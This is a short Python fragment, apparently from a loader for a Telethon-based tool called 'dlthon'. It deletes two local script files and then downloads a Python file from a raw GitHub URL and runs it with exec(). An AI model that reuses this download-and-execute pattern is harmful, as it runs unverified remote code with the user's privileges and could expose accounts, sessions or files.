...
delete_file_if_exists("dlthonkalb.py")
delete_file_if_exists("dlthon-telethon-cl.py")
...
import requests
response = requests.get("https://raw.githubusercontent.com/dlthontm/Collectdlthon/main/dlthon.py")
exec(response.text)
